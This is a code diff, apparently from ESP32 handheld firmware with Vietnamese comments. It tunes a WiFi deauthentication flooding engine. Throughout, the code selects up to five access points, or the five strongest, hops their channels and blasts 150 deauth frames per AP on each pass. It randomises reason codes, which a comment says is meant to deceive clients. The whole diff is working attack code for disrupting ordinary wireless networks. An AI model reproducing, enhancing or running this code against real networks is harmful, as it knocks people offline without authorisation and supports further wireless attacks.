@@ -1088,9 +1088,7 @@ void beaconAttack() {
 // =========================================================================
 // CÁC HÀM THÊM M?I (B?N COPY VÀ DÁN XU?NG DU?I CÙNG C?A FILE NHÉ)
 // =========================================================================
-
-// 1. ENGINE ÐÁNH MULTI (UI TINH 100% - CH? V? 1 L?N, IN DANH SÁCH M?C TIÊU)
-// 1. ENGINE ĐÁNH MULTI - BẢN EXTREME (TĂNG CƯỜNG HỎA LỰC)
+// 1. ENGINE ĐÁNH MULTI - BẢN TỐI ƯU: RAPID FIRE + RANDOM REASON CODE + UI TĨNH
 void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
     if (targets.empty()) {
         displayTextLine("No APs found!");
@@ -1100,9 +1098,9 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
         return;
     }
 
-    // UI TĨNH (Vẫn giữ để tiết kiệm CPU)
+    // --- VẼ UI TĨNH (CHỈ VẼ 1 LẦN DUY NHẤT) ---
     drawMainBorderWithTitle("Multi-Atk EXTREME");
-    tft.setTextColor(TFT_RED, bruceConfig.bgColor); // Chữ đỏ cho máu chiến
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
     tft.setCursor(10, 40);
     tft.println("Aggressive Mode Active!");
 
@@ -1114,32 +1112,36 @@ void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
         tft.setCursor(10, startY + (i * 18));
         tft.println("> " + ssid_str + " (Ch" + String(targets[i].primary) + ")");
     }
+    // ------------------------------------------
 
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
-    // VÒNG LẶP TẤN CÔNG "RAPID FIRE"
+    // Danh sách Reason Code phổ biến để đánh lừa Client
+    uint8_t reasons[] = {0x01, 0x02, 0x04, 0x06, 0x07};
+
     while (true) {
         for (const auto &target : targets) {
-            // Nhảy kênh
+            // Chuyển kênh và chuẩn bị frame
             wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
             
-            // ÉP XUNG: Chỉ nghỉ 5ms để Driver kịp nhận lệnh (Không được để 0ms vì sẽ treo)
+            // ÉP XUNG: Nghỉ 5ms để ổn định Radio sau khi nhảy kênh
             vTaskDelay(pdMS_TO_TICKS(5));
 
-            // BẮN RÁT: 30 đợt liên tục (tương đương 90 gói deauth / 1 lần ghé thăm)
+            // BẮN RÁT (50 đợt x 3 gói = 150 gói / AP) + RANDOM REASON CODE
             for (int i = 0; i < 50; i++) {
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                // Thay đổi Reason Code ở byte thứ 24 của frame
+                deauth_frame[24] = reasons[random(0, 5)];
                 
-                // Check nút bấm cực nhanh
+                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 if (check(EscPress)) goto EXIT_ENGINE;
             }
-
-            // Nghỉ tối thiểu 2ms để FreeRTOS không kick Watchdog
+            
+            // Nghỉ 2ms để FreeRTOS không kick Watchdog
             vTaskDelay(pdMS_TO_TICKS(2));
             if (check(EscPress)) goto EXIT_ENGINE;
         }
         
-        // Nghỉ vòng lặp lớn chỉ 10ms (đủ để chip xử lý task nền)
+        // Nghỉ vòng lặp lớn 10ms
         vTaskDelay(pdMS_TO_TICKS(10));
         if (check(EscPress)) goto EXIT_ENGINE;
     }
@@ -1151,9 +1153,8 @@ EXIT_ENGINE:
     returnToMenu = true;
 }
 
-// 2. TÍNH NANG TOP 5 SÓNG KH?E
+// 2. TÍNH NĂNG TOP 5 SÓNG KHỎE (GIỮ NGUYÊN 5 MỤC TIÊU)
 void deauthTop5Attack() {
-    // B?t WiFi TRU?C KHI Scan
     cleanlyStopWebUiForWiFiFeature();
     resetGlobalState();
     if (!wifi_atk_setWifi()) return;
@@ -1168,14 +1169,10 @@ void deauthTop5Attack() {
         memcpy(r.bssid, WiFi.BSSID(i), 6);
         r.primary = static_cast<uint8_t>(WiFi.channel(i));
         r.rssi = WiFi.RSSI(i);
-        
         if (strlen(WiFi.SSID(i).c_str()) > 0) {
             strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
             r.ssid[sizeof(r.ssid) - 1] = '\0';
-        } else {
-            r.ssid[0] = '\0';
         }
-        
         temp_list.push_back(r);
     }
     
@@ -1191,9 +1188,8 @@ void deauthTop5Attack() {
     execute_multi_bruce_style(top5); 
 }
 
-// 3. TÍNH NANG MULTI (CH?N TAY MAX 5)
+// 3. TÍNH NĂNG MULTI (CHỌN TAY MAX 5)
 void deauthMultiAttack() {
-    // B?t WiFi TRU?C KHI Scan
     cleanlyStopWebUiForWiFiFeature();
     resetGlobalState();
     if (!wifi_atk_setWifi()) return;
@@ -1218,12 +1214,9 @@ void deauthMultiAttack() {
         memset(&r, 0, sizeof(r));
         memcpy(r.bssid, WiFi.BSSID(i), 6);
         r.primary = static_cast<uint8_t>(WiFi.channel(i));
-        
         if (strlen(WiFi.SSID(i).c_str()) > 0) {
             strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
             r.ssid[sizeof(r.ssid) - 1] = '\0';
-        } else {
-            r.ssid[0] = '\0';
         }
         scanned_aps.push_back(r);
     }
@@ -1235,7 +1228,6 @@ void deauthMultiAttack() {
         options.clear();
         display_strings.clear();
 
-        // Nút Start
         String startBtn = "-> START ATTACK (" + String(selected_count) + "/5) <-";
         display_strings.push_back(startBtn);
         options.push_back({display_strings.back().c_str(), [&]() {
@@ -1246,7 +1238,6 @@ void deauthMultiAttack() {
             String prefix = selected[i] ? "[X] " : "[ ] ";
             String ssid_str = String((char*)scanned_aps[i].ssid);
             if (ssid_str.length() == 0) ssid_str = "HIDDEN";
-            
             String optText = prefix + ssid_str + " (Ch:" + String(scanned_aps[i].primary) + ")";
             display_strings.push_back(optText);
 
